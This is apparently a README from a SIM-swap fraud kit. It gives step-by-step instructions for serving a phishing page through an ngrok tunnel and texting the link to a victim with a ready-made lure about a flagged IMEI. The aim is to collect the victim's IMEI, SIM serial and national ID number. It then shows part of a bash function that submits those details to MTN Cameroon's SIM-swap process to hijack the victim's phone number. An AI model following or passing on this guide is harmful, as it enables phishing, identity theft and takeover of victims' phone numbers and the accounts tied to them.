Here's How to Expose the phish.html to the internet from your localhost 
Install ngrok. You can download the ngrok client for your operating system from the ngrok website: https://ngrok.com/download.
Start ngrok. In your terminal, navigate to the directory where you installed ngrok and run the following command:
ngrok http 8080
This will start ngrok and create a tunnel to your local web server(localhost), which is listening on port 8080.
3. Open the ngrok dashboard. In your browser, go to the ngrok dashboard: https://dashboard.ngrok.com/. You should see a list of tunnels that ngrok has created.
4. Find the ngrok tunnel for your local web server(localhost:8080). The tunnel name will start with http:// or https://.
5. Open the ngrok tunnel URL in your browser. This will open your HTML file in your browser.
6. Send the ngrok tunnel URL to your target's Phone Number , while crafting a really good phishing message . The Message Should Look Something Like This
"""
    Your cell phone's IMEI code has been flagged for suspicious activity.
    Please click on the link below to verify your identity and update your security settings.     
    "https://ngrok-URL-should-be-here" "(Send the Ngrok link to the Victim , And Wait For The Victims IMEI, SIM Serial Number, and ID Card Number ..)..
    there Info will Be dispalyed in the terminal , under the ngrok URL ..
    And That's what You'll use in the SIM-SWAP.sh bash script( Input the phished Details , Under these bash Function   function execute_curl_commands() {
  # Get the curl commands
  curl_commands=$(
    get_curl_command 'Select the option for SIM swap' "$cookie" "$token"
    get_curl_command 'Enter your old MTN Cameroon phone number' "$cookie" "$token"
    get_curl_command 'Enter your National ID card number or passport number' "$cookie" "$token"
    get_curl_command 'Enter the IMEI number of your phone' "$cookie" "$token"
    get_curl_command 'Enter the serial number of your old SIM card' "$cookie" "$token"
    get_curl_command 'Click on the "Submit" button' "$cookie" "$token"
  )
) to do the sim swap 
"""
Then Run The Script , with the provided details , to complete the Sim swap ..
Now, anyone on the internet can access your HTML file by visiting the ngrok tunnel URL.

Here are some additional things to keep in mind:

The port number that you specify in the ngrok http command must be the same port number that your local web server is listening on.
If you are using a firewall, you may need to configure it to allow traffic to the port number that you are using.
The ngrok tunnel will only be active for as long as ngrok is running. If you want to keep the tunnel active, you can run ngrok in the background.

Happy Hacking ..
